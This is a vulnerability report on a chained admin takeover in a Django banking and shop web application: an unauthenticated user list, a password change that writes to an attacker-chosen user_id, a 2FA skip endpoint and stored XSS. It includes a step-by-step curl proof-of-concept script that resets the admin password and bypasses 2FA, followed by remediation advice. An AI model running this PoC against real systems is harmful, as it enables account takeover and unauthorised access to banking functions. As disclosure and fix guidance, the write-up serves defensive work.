# Description

**CWE-269: Improper Privilege Management** (chained via CWE-306 Missing Authentication for Critical Function, CWE-639 Authorization Bypass Through User-Controlled Key, and CWE-287 Improper Authentication)

This is a multi-step chain rather than a single flaw. A regular, authenticated user with no staff rights can take over the platform's administrator account and reach the staff-only banking administration page. Each link in the chain is an individually documented finding, and none of them is critical on its own:

| Step | Vuln ID | Endpoint | Source |
|------|---------|----------|--------|
| 1 | E4 - Unauthenticated user list | `GET /api/users/` | `Api/urls.py:220`, `Api/views.py:3850` (`user_list`, no auth decorator) |
| 2 | E6 - Username/email enumeration oracle | `GET /api/check-user/?email=...` | `Api/urls.py:222`, `Api/views.py:3856` (`check_user`) |
| 3 | M4 - Broken access control on account settings | `POST /account/settings/` with `user_id` | `Account/urls.py:20`, `Account/views.py:411-442` (`settings`) |
| 4 | M6 - 2FA bypass (or M15 - TOTP secret leak) | `GET /account/ask-2fa/no` (or `GET /api/totp-secret/?username=admin`) | `Account/urls.py:27`, `Account/views.py:337-342` (`ask_2fa_no`); `Api/urls.py:226`, `Api/views.py:3889` (`totp_secret`) |
| 5 | M3 - Stored XSS in article content | `POST /shop/sell/` (`add_article`) | `Shopping/urls.py:65` |
| 6 | Staff-only banking admin reached as admin | `GET /banking/admin/` | `Bank/urls.py:69`, `Bank/views_admin.py:61-69` (`banking_admin`, `is_staff` check) |

**Root cause summary.** The chain works because (a) the user directory is exposed without authentication, (b) the settings view checks the caller's password but writes the password of an attacker-chosen `user_id`, (c) the 2FA "skip" endpoint marks the session as 2FA-verified without verifying any factor, and (d) the staff-only banking page trusts only the session's `is_staff` flag, so any session that has become the admin session inherits full access. Fixing any single link (M4, M6, E4, or M15) breaks the chain.

Per the source, `settings()` at `Account/views.py:430-442` reads `user_id` from `request.POST` with a fallback to `request.user.id`, then calls `target_user.set_password(new)` on that user. The old-password check (`request.user.check_password(old)`) is performed against the logged-in user, not the target, so any authenticated user who knows their own password can overwrite any other account's password.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Call `GET /api/users/` without authentication (E4). Read the `user__username` and `bid` fields. | A JSON list of every username and bid is returned, including `admin`. No credentials are needed. |
| 2 | Call `GET /api/check-user/?email=admin` (E6). | Response is `{"exists": true}`, which confirms the admin account exists and can be targeted. |
| 3 | Register or log in as a normal account (for example `johndoe`). Send `POST /account/settings/` with `old_password=<own password>`, `new_password=pwned`, `confirm_password=pwned`, `user_id=1` (M4). | The server validates the attacker's own old password, then calls `set_password('pwned')` on user id 1 (admin). The response is a success message, and the admin password is now `pwned`. |
| 4 | Log in as `admin` with `pwned`. Request `GET /account/ask-2fa/no` (M6). Alternatively, fetch `GET /api/totp-secret/?username=admin` (M15) and submit a valid code to `/account/verification/`. | `ask_2fa_no` clears `totp_key` on the admin profile and sets `session['2FA'] = 1` with no verification. The session is treated as 2FA-verified and is redirected to `/account/process/bank/`. |
| 5 | As admin, submit an article to `/shop/sell/` with a stored XSS payload in the body (M3). Wait for an admin or other victim to view the article. | The payload runs in the victim's browser and can exfiltrate the victim's session cookie to an attacker-controlled host, giving the attacker additional authenticated sessions. The payload itself is documented under M3. |
| 6 | Request `GET /banking/admin/` with the admin session. | Because `request.user.is_staff` is true for admin, the page renders the banking administration dashboard (backend status and connectivity) instead of redirecting to `index` with "Access denied". This is the proof condition. |

# PoC

The commands below use `curl` against `TARGET=http://localhost:8000`. They assume the admin account is user id `1` and that `johndoe` is an existing account. Replace the password with your own. The `grep` patterns extract the CSRF token from the form HTML.

```bash
TARGET=http://localhost:8000
JOHN_PW='Tr@c3d!7BxN#m9Kw2YpL'

# Step 1 - E4: list users without authentication
curl -s "$TARGET/api/users/" | grep -oE '"user__username": "[^"]+"' | head

# Step 2 - E6: confirm the admin account exists
curl -s "$TARGET/api/check-user/?email=admin"
# expected: {"exists": true}

# Step 3 - M4: log in as johndoe, then overwrite admin's password via user_id=1
CSRF=$(curl -s -c john.cookies "$TARGET/account/login/" \
  | grep -oE 'csrfmiddlewaretoken" value="[^"]+' | head -1 | cut -d'"' -f3)
curl -s -b john.cookies -c john.cookies -X POST \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=johndoe" \
  --data-urlencode "password=$JOHN_PW" \
  -H "Referer: $TARGET/account/login/" \
  "$TARGET/account/login/" > /dev/null

SCSRF=$(curl -s -b john.cookies -c john.cookies "$TARGET/account/settings/" \
  | grep -oE 'csrfmiddlewaretoken" value="[^"]+' | head -1 | cut -d'"' -f3)
curl -s -b john.cookies -X POST "$TARGET/account/settings/" \
  --data-urlencode "csrfmiddlewaretoken=$SCSRF" \
  --data-urlencode "old_password=$JOHN_PW" \
  --data-urlencode "new_password=pwned" \
  --data-urlencode "confirm_password=pwned" \
  --data-urlencode "user_id=1" \
  -H "Referer: $TARGET/account/settings/" > /dev/null

# Step 4 - M6: log in as admin with the new password, then skip 2FA
ACSRF=$(curl -s -c admin.cookies "$TARGET/account/login/" \
  | grep -oE 'csrfmiddlewaretoken" value="[^"]+' | head -1 | cut -d'"' -f3)
curl -s -b admin.cookies -c admin.cookies -X POST \
  --data-urlencode "csrfmiddlewaretoken=$ACSRF" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=pwned" \
  -H "Referer: $TARGET/account/login/" \
  "$TARGET/account/login/" > /dev/null
curl -s -b admin.cookies -c admin.cookies "$TARGET/account/ask-2fa/no" > /dev/null

# Step 5 - M3 (stored XSS) is delivered by submitting an article to /shop/sell/.
# The exact payload and the victim-side session theft are documented in the M3 write-up.

# Step 6 - Proof: the staff-only banking admin page is readable as admin
curl -sD - -b admin.cookies "$TARGET/banking/admin/" -o /tmp/banking_admin.html | head -1
grep -io "banking" /tmp/banking_admin.html | head -1
# expected: HTTP/1.1 200 OK, page body contains the banking admin dashboard
```

Browser alternative for step 4: after logging in as admin, navigate to `/account/ask-2fa/no` and then to `/banking/admin/`.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Full read access to the admin account and to any data the admin can see, including the staff banking admin pages, the full user directory (usernames and bids), and sessions of other users reachable via the stored XSS in step 5. |
| Integrity | The attacker can change the admin password, bypass 2FA, and act as admin across the platform. Stored XSS in step 5 lets the attacker act as other users who view the poisoned content. |
| Availability | An admin-level session can suspend or modify accounts and content. The attacker can also lock the real admin out by keeping the changed password. Availability impact is possible but not the primary consequence. |

Overall severity: **Critical** — an unauthenticated user list plus an authenticated, non-privileged account are enough to reach full administrative access in under a minute. The chain exposes staff-only banking functions and enables session theft across the user base. The CVSS 3.1 base score documented for this chain is 9.6 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`), which is consistent with the Critical rating.

# Remediation

1. Fix M4 first and most cheaply: in `Account/views.py` `settings()`, remove the `user_id` lookup entirely and always operate on `request.user`. Verify the old password against the same user that will be updated.
2. Fix M6: `ask_2fa_no` must not set `session['2FA'] = 1` without a verified factor. Remove this endpoint or require successful TOTP or email 2FA verification before marking the session verified.
3. Fix M15: `totp_secret` in `Api/views.py` must not return TOTP secrets, and should require authentication and only return data for the requesting user. Secrets should never leave the server after enrollment.
4. Fix E4 and E6: require authentication on `user_list` and `check_user`. Return generic responses from `check-user` to avoid username and email enumeration.
5. Fix M3: escape or sanitize article content on output and set session cookies as `HttpOnly` so injected scripts cannot read them.
6. Enforce least privilege on the banking admin page: keep the `is_staff` check and additionally require a fresh, verified second factor for staff access to `/banking/admin/`.
7. Add an integration test that replays this PoC and asserts that the final request to `/banking/admin/` returns `302` to the login page rather than `200 OK`, and that `/account/ask-2fa/no` does not grant 2FA status.
8. Treat every link in this chain as load-bearing during code review. A regression that re-enables M4 or M6 reopens full administrative takeover.

# Author
WOCSA
